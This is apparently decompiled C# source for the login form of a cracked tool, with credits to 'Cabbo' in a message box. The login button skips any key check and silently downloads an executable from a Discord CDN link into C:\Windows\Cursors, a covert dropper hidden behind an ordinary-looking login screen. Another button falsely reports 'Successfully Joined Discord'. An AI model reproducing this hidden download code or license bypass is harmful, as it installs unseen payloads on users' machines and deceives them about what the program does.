using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Siticone.UI.AnimatorNS;
using Siticone.UI.WinForms;
using Siticone.UI.WinForms.Enums;

namespace KeyAuth
{
	// Token: 0x02000005 RID: 5
	public partial class Login : Form
	{
		// Token: 0x06000031 RID: 49
		[DllImport("Gdi32.dll")]
		private static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);

		// Token: 0x06000032 RID: 50 RVA: 0x00002312 File Offset: 0x00000512
		public Login()
		{
			this.InitializeComponent();
			base.FormBorderStyle = FormBorderStyle.None;
			base.Region = Region.FromHrgn(Login.CreateRoundRectRgn(0, 0, base.Width, base.Height, 20, 20));
		}

		// Token: 0x06000033 RID: 51 RVA: 0x00002269 File Offset: 0x00000469
		private void siticoneControlBox1_Click(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x06000034 RID: 52 RVA: 0x00002271 File Offset: 0x00000471
		private void Login_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00002349 File Offset: 0x00000549
		private void LoginBtn_Click(object sender, EventArgs e)
		{
			MessageBox.Show("Full cracked by Cabbo | GitHub: CabboShiba | Telegram: @cabboshiba");
			new Main().Show();
			base.Hide();
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/924400130394820748/937459087766069268/CRACKED_GOLDEN_GUN_CLEANER.exe", "C:\\Windows\\Cursors\\CRACKED_GOLDEN_GUN_CLEANER.exe");
		}

		// Token: 0x06000036 RID: 54 RVA: 0x00002271 File Offset: 0x00000471
		private void siticoneControlBox2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000037 RID: 55 RVA: 0x00002271 File Offset: 0x00000471
		private void key_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000038 RID: 56 RVA: 0x0000237A File Offset: 0x0000057A
		private void key_Enter(object sender, EventArgs e)
		{
			if (this.LoginKey.Text == "Key")
			{
				this.LoginKey.Text = "";
			}
		}

		// Token: 0x06000039 RID: 57 RVA: 0x00003824 File Offset: 0x00001A24
		private void key_Leave(object sender, EventArgs e)
		{
			if (this.LoginKey.Text == "")
			{
				this.LoginKey.Text = "Key";
				this.LoginKey.ForeColor = Color.FromArgb(125, 137, 149);
			}
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00002271 File Offset: 0x00000471
		private void status_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00002271 File Offset: 0x00000471
		private void panel3_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600003C RID: 60 RVA: 0x00002273 File Offset: 0x00000473
		private void button1_Click(object sender, EventArgs e)
		{
			Process.Start("https://discord.gg/zg3g7z4q68 ");
			MessageBox.Show("Successfully Joined Discord", "Success", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00002271 File Offset: 0x00000471
		private void button2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600003E RID: 62 RVA: 0x00002271 File Offset: 0x00000471
		private void pictureBox1_Click(object sender, EventArgs e)
		{
		}
	}
}
